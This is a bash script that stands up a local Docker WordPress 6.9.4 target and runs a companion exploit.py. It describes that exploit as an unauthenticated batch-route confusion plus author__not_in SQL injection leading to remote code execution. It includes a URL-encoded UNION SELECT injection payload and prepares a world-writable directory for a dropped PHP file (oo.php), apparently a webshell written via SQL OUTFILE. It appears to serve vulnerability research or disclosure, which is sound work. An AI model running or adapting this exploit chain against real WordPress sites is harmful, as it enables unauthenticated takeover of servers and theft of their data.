#!/usr/bin/env bash
# Brings up a STOCK WordPress 6.9.4 target (no plugin) and runs the anonymous
# batch-route confusion + author__not_in SQLi -> RCE exploit (exploit.py).
#   ./run.sh            # up + install + exploit
#   ./run.sh down       # teardown
set -euo pipefail
cd "$(dirname "$0")"
PORT=${PORT:-8888}

if [[ "${1:-}" == "down" ]]; then
  docker compose down -v --remove-orphans
  exit 0
fi

echo "[+] preparing shared OUTFILE/webroot dir"
mkdir -p rce
chmod 777 rce
rm -f rce/oo.php

echo "[+] starting STOCK target: mysql:8.0 + wordpress:6.9.4 (no plugin)"
docker compose up -d

echo "[+] waiting for wordpress http ..."
for _ in $(seq 1 90); do
  curl -sf "http://localhost:${PORT}/wp-admin/install.php" >/dev/null 2>&1 && break
  sleep 1
done

echo "[+] installing wordpress (stock, default content)"
curl -sS "http://localhost:${PORT}/wp-admin/install.php?step=2" \
  --data-urlencode 'weblog_title=PoC' \
  --data-urlencode 'user_name=admin' \
  --data-urlencode 'admin_password=admin' \
  --data-urlencode 'admin_password2=admin' \
  --data-urlencode 'pw_weak=on' \
  --data-urlencode 'admin_email=poc@example.com' \
  --data-urlencode 'blog_public=0' >/dev/null || true

echo "[+] sanity: direct REST author_exclude is sanitized (expect 400)"
echo -n "    ?rest_route=/wp/v2/posts&author_exclude=<sqli>  -> HTTP "
curl -s -o /dev/null -w '%{http_code}\n' --max-time 12 \
  "http://localhost:${PORT}/?rest_route=/wp/v2/posts&author_exclude=1)%20AND%201%3D0%20UNION%20SELECT%20999--%20-" || true
echo "    (the exploit bypasses this via the batch-route confusion)"

echo
echo "[+] running Python exploit (anonymous, no auth)"
python3 exploit.py
